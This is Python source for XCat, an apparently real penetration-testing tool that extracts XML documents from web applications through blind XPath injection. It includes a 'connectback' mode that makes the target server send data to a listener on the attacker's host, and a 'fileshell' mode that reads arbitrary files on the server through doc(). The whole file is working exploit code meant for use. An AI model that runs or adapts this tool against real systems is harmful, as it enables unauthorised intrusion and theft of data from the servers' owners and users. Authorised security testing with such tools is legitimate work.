# XCat
# Command line utility for extracting XML documents through XPath injection vulnerabilities
import argparse
from twisted.internet import reactor, defer
from lib import SimpleXMLWriter, payloads
from twisted.web import server, resource
from twisted.python import failure
import sys
import hashlib
import time
__VERSION__ = 0.5

writer = SimpleXMLWriter.XMLWriter(sys.stdout)

class CountTypes:
    LENGTH = 1
    STRING  = 2
    CODEPOINT = 3

@defer.inlineCallbacks
def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
    global args
    MIN, MAX = (0, 10)
    INC = 10
    STEP = args.step_size

    if count_type == CountTypes.LENGTH:
        search_query = "GET_COUNT_LENGTH"
        specific_query ="NODE_COUNT"
    elif count_type == CountTypes.STRING:
        if args.normalize_unicode:
            search_query = "GET_COUNT_LENGTH_U"
            specific_query = "NODE_COUNT_U"
        else:
            search_query = "GET_CONTENT_LENGTH"
            specific_query = "NODEVALUE_LENGTH"
    else:
        search_query = "GET_CODEPOINT_LENGTH"
        specific_query = "GET_NODE_CODEPOINT"

        #INC = 20
        #MAX = 20
        STEP = 20

    # Check if its nill first
    test = yield payloads.RunQuery(payloads.Get(specific_query)(node=node, count=0, index=_codepoint_count))
    if test:
        defer.returnValue(0)

    # Chop it into sections

    for i in xrange(STEP):
        r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count))
        #raw_input("Count: r = %s"%r)
        if not r:
            MIN+=INC
            MAX+=INC
        else:
            tlist = []
            for i in xrange(MIN, MAX+1):
                tlist.append(payloads.RunQuery(payloads.Get(specific_query)(node=node,index=_codepoint_count, count=i, value=chr(i))))
            results = yield defer.gatherResults(tlist)
            if not any(results):
                defer.returnValue(0)
            defer.returnValue(MIN+results.index(True))


class DocRequestHandler(resource.Resource):
    isLeaf = True

    def __init__(self):
        resource.Resource.__init__(self)
        self.ids = {}

    def AddConnection(self):
        id = hashlib.md5(str(time.time())).hexdigest()
        self.ids[id] = None
        return id

    def GetResult(self, id):
        return self.ids.get(id,None)

    def render_GET(self, request):
        if all([request.args.get("q",None), request.args.get("id",None)]):
            id = request.args.get("id")[0]
            d  = request.args.get("q")[0]
            if id not in self.ids:
                return sys.stderr.write("Error: query ID %s does not exist"%id)
            self.ids[id] = d

        return "<emptynode></emptynode>"


class DocServerHandler(server.Site):
    def log(self, *args, **kwargs):
        return # Do nothing


@defer.inlineCallbacks
def GetCharacters(payloads, node, size=0, count_it=False):
    global args
    if count_it and not args.connectback:
        size = yield Count(payloads, node=node, count_type=CountTypes.STRING)
        #raw_input("\nGot size %s for node %s"%(size, node))

    if args.connectback:
        global rhandler
        id = rhandler.AddConnection()
        yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER")(node=node, id=id, host=args.connectback_ip))
        info = rhandler.GetResult(id)
        defer.returnValue(info or "")
    else:
        returner = []
        _counter = 0
        while True:
            _counter+=1
            if not size == 0:
                if _counter > size:
                    break

            _found = False
            if args.xversion == "1":
                for char in (payloads.GetSearchSpace()):
                    r = yield payloads.RunQuery(payloads.Get("GET_NODE_SUBSTRING")(node=node, count=_counter, character=char))
                    if r:
                        returner.append(char)
                        _found = True
            else:
                r = yield Count(payloads, node, count_type=CountTypes.CODEPOINT, _codepoint_count=_counter)
                #raw_input("GetCharacters: r = %s"%r)
                if r:
                    returner.append(chr(r))
                    _found = True

            if not _found:
                break

        defer.returnValue("".join(returner))

@defer.inlineCallbacks
def GetXMLFromDefinedQuery(payloads, node):
    # Count the set
    count = yield Count(payloads, node=node.replace("$COUNT","*"), count_type=CountTypes.LENGTH)

    if not count:
        print "Found 0 nodes to extract, exiting"
    else:
        print "Found %s nodes to extract"%count

        for i in xrange(1, count+1):
            _c = node.replace("$COUNT",str(i))
            yield GetXMLFromNode(payloads, _c)

@defer.inlineCallbacks
def GetXMLFromNode(payloads, node):
    global args
    #print "Node: %s"%node
    node_name = yield GetCharacters(payloads, "name(%s)"%node, count_it=True)
    attribute_count = yield Count(payloads, node=node+"/@*", count_type=CountTypes.LENGTH)
    attributes = {}
    if attribute_count:
        for i in xrange(1, attribute_count+1):
            attribute = yield GetCharacters(payloads, "name(%s)"%(node+"/@*[%s]"%i))
            if not args.schema_only:
                value     = yield GetCharacters(payloads, node+"/@*[%s]"%i)
            else:
                value = ""
            #raw_input("Got attribute '%s' value '%s'"%(attribute, value))
            attributes[attribute] = value

    writer.start(node_name, attrib=attributes)

    if not args.schema_only:
        commentCount = yield Count(payloads, node+"/comment()", count_type=CountTypes.LENGTH)
        if commentCount:
            for i in xrange(1, commentCount+1):
                comment = yield GetCharacters(payloads, node+"/comment()[%s]"%i, count_it=True)
                if comment:
                    writer.comment(comment)

    child_node_count = yield Count(payloads, node=node+"/*", count_type=CountTypes.LENGTH)
    #print "Child node count: %s"%child_node_count
    if child_node_count:
        for i in xrange(1, child_node_count+1):
            yield GetXMLFromNode(payloads, node+"/*[%s]"%i)

    if not args.schema_only:
        value = yield GetCharacters(payloads, node+"/text()", count_it=True)
        if value:
            writer.data(value)

    writer.end()

@defer.inlineCallbacks
def Main(args):
    global payloads
    payloads = payloads.PayloadMaker(args)

    if args.xversion == "auto":
        xversion = yield payloads.DetectXPathVersion()
        sys.stderr.write("Detected XPath version %s\n"%xversion)

    if args.error_keyword and args.xversion == "1":
        sys.stderr.write("Error based detection is unavailable when attacking targets running XPath 1.0\n")
        sys.exit(1)

    if args.connectback and args.xversion == "1":
        sys.stderr.write("Connectback is only supported with XPath 2.0")
        sys.exit(1)

    if args.connectback and not args.connectback_ip:
        sys.stderr.write("Error: You must specify a IP when using connectback\n")
        sys.exit(1)

    sys.stderr.write("Exploiting...\n")
    t1 = time.time()
    if args.getcwd:
        if not args.xversion == "2":
            sys.stderr.write("Working file detection is only supported in XPath 2.0")
            sys.exit(1)
        #payloads.SetSearchSpace(string.ascii_letters + string.punctuation + string.digits + " ")
        cwd = yield GetCharacters(payloads, "document-uri(/)")
        print "Working file: %s"%cwd
    elif args.executequery:
        yield GetXMLFromDefinedQuery(payloads, args.executequery)
    elif args.fileshell:
        while True:
            print "Enter a file URI (Must be absolute). Use --getcwd to see where we are"
            file_path = raw_input()
            if file_path == "":
                break
            else:
                yield GetXMLFromDefinedQuery(payloads, ("doc('%s')/*[$COUNT]"%file_path).replace("'", args.quote_character))
                print ""

    else:
        yield GetXMLFromNode(payloads, "/*")
    t2 = time.time()
    if args.timeit:
        sys.stderr.write("\nTime taken: %s\n"%str(t2-t1))
    reactor.stop()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
    parser.add_argument("--method", help="HTTP method to send", action="store",
        default="GET", choices=["GET","POST"], dest="http_method")
    parser.add_argument("--arg", help="POST or GET argument(s) to send. The payload will be appended", type=str, action="store",
        dest="post_argument")

    detection = parser.add_mutually_exclusive_group()

    group = detection.add_mutually_exclusive_group()
    group.add_argument("--true", help="Keyword that if present indicates a success", dest="true_keyword")
    group.add_argument("--false", help="Keyword that if present indicates a failure (And if not present indicates a success)", dest="false_keyword")
    group.add_argument("--error", help="Keyword that if present indicates a server error. Used for exploiting injection vectors that give no output, but can be caused to error",
        dest="error_keyword")

    group2 = detection.add_mutually_exclusive_group()
    group2.add_argument("--true-code", help="The HTTP status code that indicates a success", dest="true_code", type=int)
    group2.add_argument("--false-code", help="The HTTP status code that indicates a failure", dest="fail_code", type=int)
    group2.add_argument("--error-code", help="The HTTP status code that indicates a server error", dest="error_code", type=int)

    parser.add_argument("--schema-only", help="Only extract the node names and no text data or attribute values", action="store_true", dest="schema_only")
    parser.add_argument("--quotecharacter", help="The quote character we will use to inject (normally' or \")", default="\"", dest="quote_character")
    parser.add_argument("--executequery", help="If given recurse through this query and extract the results, instead of searching from the root node. use $COUNT to insert the current node we are looking at. eg: /users/user[$COUNT]/password",
        default="", dest="executequery")

    parser.add_argument("--max_search", help="The max number of characters to search to before giving up", dest="search_limit", type=int, default=20)
    parser.add_argument("--timeout", help="Socket timeout to set", type=int, default=5, dest="timeout", action="store")
    parser.add_argument("--stepsize", help="When counting text contents (which could be very large) this is the max number of characters to count up to, times by ten",
        type=int, default=10, dest="step_size", action="store")
    parser.add_argument("--normalize", help="Normalize unicode", choices=["NFD","NFC","NFDK","NFKC"], action="store", dest="normalize_unicode")
    parser.add_argument("--xversion", help="The xpath version to use", choices=["1","2","auto"], default="auto", action="store",dest="xversion")
    parser.add_argument("--lowercase", help="Speed up retrieval time by making all text lowercase before searching. Xpath 2.0 only",
        default=False, dest="lowercase", action="store_true")
    parser.add_argument("--regex", help="Use Regex to reduce the search space of text. Xpath 2.0 only",
        default=False, dest="use_regex", action="store_true")
    group2 = parser.add_mutually_exclusive_group()
    #group2.add_argument("--dns", help="Experimental: Use DNS requests to transfer data. XPath 2.0 only. This parameter is the end of the hostname. Only works with alphanumeric characters, 64character limit (in total).",
    #                             action="store", dest="dns_location")
    group2.add_argument("--connectback", help="Use a clever technique to deliver the XML document data over HTTP to xcat. Requires a public IP address and port listening permissions",
        action="store_true", dest="connectback")

    parser.add_argument("--connectbackip", help="IP Address to listen on for connectback", action="store", dest="connectback_ip")
    parser.add_argument("--connectbackport", help="The port to listen on for connectback data", action="store", dest="connectback_port", default=80, type=int)

    parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
    parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
    parser.add_argument("--getcwd", help="Retrieve the XML documents URI that the server is executing our query against", action="store_true", dest="getcwd")
    parser.add_argument("--useragent", help="User agent to use", action="store", dest="user_agent", default="XCat %s"%__VERSION__)
    parser.add_argument("--timeit", help="Time the retrieval", action="store_true", dest="timeit", default=False)
    parser.add_argument("URL", action="store")
    args = parser.parse_args()

    sys.stderr.write("XCat version %s\n"%__VERSION__)

    if not any([args.false_keyword, args.true_keyword, args.error_keyword]):
        sys.stderr.write("Error: You must supply a false, true or error keyword\n")
        sys.exit(1)

    if args.http_method == "POST":
        if not args.post_argument:
            sys.stderr.write("Error: You must supply some POST arguments if you are making a POST request!\n")
            sys.exit(1)


    if args.true_keyword:
        args.lookup = True
    else:
        args.lookup = False

    rhandler = DocRequestHandler()
    site = DocServerHandler(rhandler)
    if args.connectback:
        reactor.listenTCP(80, site)


    Main(args)

    reactor.run()